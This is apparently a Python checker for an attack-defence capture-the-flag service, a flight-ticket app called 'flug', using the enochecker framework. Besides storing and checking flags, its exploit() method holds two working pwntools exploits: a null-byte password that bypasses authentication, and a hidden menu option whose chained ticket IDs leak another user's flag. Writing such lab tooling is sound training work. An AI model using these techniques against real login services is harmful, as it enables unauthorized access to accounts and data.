#!/usr/bin/env python3
 
from pwn import * 
import sys
import time
from enochecker import *
import string
from random import randrange


#BrokenServiceException = broken but its reachable 
#OfflineException = obvious

class FlugChecker(BaseChecker):

    flag_count = 1
    noise_count = 1
    havoc_count = 1
    global port 
    port = 7478
    service_name = "flug"


    def putflag(self):  # type: () -> None
        username = self.gen_user()
        password = self.gen_password()

        try:
            p = remote(self.address,port)
        except:
            raise OfflineException("Unable to connect to the service [putflag]")



        try:    
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"2")
            p.sendlineafter(b"Please input your new username:",bytes(username,'utf-8'))
            p.sendlineafter(b"Please input your password:\n",bytes(password,'utf-8'))
        except:
            raise BrokenServiceException("Registration failed [putflag]")


        try:
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"1")
            p.sendlineafter(b"Please input your username:\n",bytes(username,'utf-8'))
            p.sendlineafter(b"Please input your password:\n",bytes(password,'utf-8'))
        except:
            raise BrokenServiceException("Login failed [putflag]")


        try:
            p.recvuntil(b"================\n")   
            p.sendlineafter(b"================\n",b"1")
            time.sleep(.1)
            p.recvuntil(b"Please input origin airport\n")
            p.sendline(bytes(self.noise,'utf-8'))
            p.recvuntil(b"Please input destination airport\n")
            p.sendline(bytes(self.noise,'utf-8'))
            p.recvuntil(b"Enter the content of your new ticket\n")
            p.sendline(bytes(self.flag,'utf-8'))
            time.sleep(.1)
            p.recvuntil("Your new ticket ID is:\n")
            ticket_id = p.recvline().decode('utf-8')
            self.team_db[self.flag] = (username,password,ticket_id)
        except:
            raise BrokenServiceException("Put flag failed [putflag]")


    def getflag(self):  # type: () -> None
        try:
            p = remote(self.address,port)
        except:
            raise OfflineException("Connection failed [getflag]")


        try:
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n","3")
            p.sendlineafter(b"Enter the unique id of your ticket",bytes(self.team_db[self.flag][2],'utf-8'))
            p.recvline()
            p.recvline()
            p.recvline()
            p.recvline()
            p.recvline()
            flag2 = p.recvline().decode('utf-8')
        except:
            raise BrokenServiceException("Unable to get flag from the service [getflag]")
        if flag2.strip() != self.flag.strip():
            raise BrokenServiceException("The flags dont mach! [getflag]")


    def putnoise(self):  # type: () -> None

        username = self.gen_user()
        password = self.gen_password()

        try:
            p = remote(self.address,port)
        except:
            raise OfflineException("Unable to connect to the service [putnoise]")



        try:    
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"2")
            p.sendlineafter(b"Please input your new username:",bytes(username,'utf-8'))
            p.sendlineafter(b"Please input your password:\n",bytes(password,'utf-8'))
        except:
            raise BrokenServiceException("Registration failed [putnoise]")


        try:
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"1")
            p.sendlineafter(b"Please input your username:\n",bytes(username,'utf-8'))
            p.sendlineafter(b"Please input your password:\n",bytes(password,'utf-8'))
        except:
            raise BrokenServiceException("Login failed [putnoise]")


        try:
            p.recvuntil(b"================\n")   
            p.sendlineafter(b"================\n",b"1")
            time.sleep(.1)
            p.recvuntil(b"Please input origin airport\n")
            p.sendline(bytes(self.noise,'utf-8'))
            p.recvuntil(b"Please input destination airport\n")
            p.sendline(bytes(self.noise,'utf-8'))
            p.recvuntil(b"Enter the content of your new ticket\n")
            p.sendline(bytes(self.noise,'utf-8'))
            time.sleep(.1)
            p.recvuntil("Your new ticket ID is:\n")
            noise_id = p.recvline().decode('utf-8')
            self.team_db[self.noise] = (username,password,noise_id)
        except:
            raise BrokenServiceException("Put noise failed [putnoise]")


        self.team_db["noise"] = self.noise
    def getnoise(self):  # type: () -> None

        try:
            p = remote(self.address,port)
        except:
            raise OfflineException("Connection failed [getflag]")


        try:
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n","3")
            p.sendlineafter(b"Enter the unique id of your ticket",bytes(self.team_db[self.noise][2],'utf-8'))
            p.recvline()
            p.recvline()
            p.recvline()
            p.recvline()
            p.recvline()
            noise = p.recvline().decode('utf-8')
        except:
            raise BrokenServiceException("Unable to get noise from the service [getnoise]")
        if noise.strip() != self.noise.strip():
            raise BrokenServiceException("The noises dont mach! [getnoise]")
        """
        This method retrieves noise in the service.
        The noise to be retrieved is inside self.flag
        The difference between noise and flag is, tht noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using flag_idx.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
    def havoc(self):  # type: () -> None
        self.putnoise()
        self.getnoise()

        try:
            p = remote(self.address,port)
        except:
            raise OfflineException('service is unreachable [havoc]')
        pass_test = True


        #we create a new ticket with current noise 
        test_ticket = self.team_db[self.noise][2]
        test_value = self.noise 

        # we login using current noise user
        test_user = self.team_db[self.noise][0]
        test_pass = self.team_db[self.noise][1]

        #we check for words in these arrs when checking the menu
        must_be_in_menu1 = ['menu','login','register','view ticket','exit','about','anonymous','bookings']
        must_be_in_view_ticket_menu = ['ticket','id']
        must_be_in_menu_when_logged_in = ['buy ticket','view my tickets','view ticket','logout']

        #Check first menu
        menu1 = p.recv(210).decode('utf-8').lower()
        for elem in must_be_in_menu1:
            if elem not in menu1:
                print('failed first test: \'{}\' not in menu'.format(elem))
                raise BrokenServiceException('Menu1 isnt ok [havoc]')

        p.sendline(b'3')
        menu_after_view_ticket_global = p.recv(200).decode('utf-8').lower()

        #Check the view ticket message
        for elem in must_be_in_view_ticket_menu:
            if elem not in menu_after_view_ticket_global:
                print('failed second test: \'{}\' not in menu'.format(elem))
                raise BrokenServiceException('View Ticket menu is not ok [havoc]')

        p.sendline(test_ticket)

        p.sendlineafter(b"================\n",b'1')
        p.sendlineafter(b'Please input your username:\n',bytes(test_user,'utf-8'))
        p.sendlineafter(b'Please input your password:\n',bytes(test_pass,'utf-8'))
        logged_in_menu =p.recv(130).decode('utf-8').lower()
        logged_in_menu +=p.recv(130).decode('utf-8').lower()

        #Check the menu when logged in
        for elem in must_be_in_menu_when_logged_in:
            if elem not in logged_in_menu:
                print('failed last test: \'{}\' not in menu'.format(elem))
                raise BrokenServiceException('menu when logged isnt ok [havoc]')

        """
        This method unleashes havoc on the app -> Do whatever you must to prove the service still works. Or not.
        On error, raise an EnoException.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """

    def exploit(self):
        #1st vuln

        p = remote(self.address,port)
        username = self.team_db[self.flag][0]

        p.recvuntil(b"================\n")
        p.sendlineafter(b"================\n",b'1')
        p.sendlineafter(b"Please input your username:\n",bytes(username,'utf-8'))
        p.sendlineafter(b"Please input your password:\n",'\x00')

        p.recvuntil('welcome ')
        check_line = p.recvline().decode('utf-8').replace('\n','')

        p.recvuntil(b"================\n")
        p.sendlineafter(b"================\n",b"2")
        stdo = p.recvline()
        flag_id = p.recvline().decode('utf-8').split(' ')[1]

        p.recvuntil(b"================\n")
        p.sendlineafter(b"================\n",b"3")
        p.sendlineafter(b"Enter the unique id of your ticket",bytes(flag_id,'utf-8'))
        p.recvline()
        p.recvline()
        flag = p.recvline().decode('utf-8').replace('\n','')

        if username == check_line:
            print(flag)
        else:
            print("Sad nox")
        pass

        #++++++++++++++++++++++++++++++++++++++++++++
        #++++++++++++++++++++++++++++++++++++++++++++
    
        #2nd wuln
    
        p = remote(self.address,port)

        username = self.team_db[self.flag][0] 

        p.recvuntil('================\n')
        p.sendlineafter('================\n',b'1')
        p.sendlineafter('Please input your username:\n',bytes(username,'utf-8'))
        p.sendlineafter('Please input your password:\n',b'x_x_x_x_x_x')
        
        
        p.recvuntil('================\n')
        p.sendlineafter('================\n',b'5')
        p.sendlineafter('Please input origin airport\n','x_x_x_x_x_x')
        p.sendlineafter('Please input destination airport\n','x_x_x_x_x_x')
        p.sendlineafter('Enter the content of your new ticket\n','x_x_x_x_x_x')
        p.recvuntil('Your new ticket ID is:\n')
        new_id = int(p.recvline().decode('utf-8').replace('\n',''),10)
        
        
        p.recvuntil('================\n')
        p.sendlineafter('================\n',b'3')
        p.sendlineafter('Enter the unique id of your ticket\n',bytes(str(new_id),'utf-8'))
        p.recvline()
        p.recvline()
        p.recvline()
        flag_id = int(p.recvline().decode('utf-8').replace('\n',''),10)
        
        
        p.recvuntil('================\n')
        p.sendlineafter('================\n',b'3')
        p.sendlineafter('Enter the unique id of your ticket\n',bytes(str(flag_id),'utf-8'))
        p.recvline()
        
        
        flag = str(p.recvline().decode('utf-8').replace('\n',''))
        
        print(flag)

    def gen_user(self): 
        source = list(string.ascii_lowercase)
        username =''
        for num in range(25):
            rand_int = randrange(25)
            username += source[rand_int]
        return username

    def gen_password(self): 
        source = list(string.ascii_lowercase)
        password =''
        for num in range(25):
            rand_int = randrange(25)
            password += source[rand_int]
        return password




app = FlugChecker.service

if __name__ == "__main__":
        run(FlugChecker)
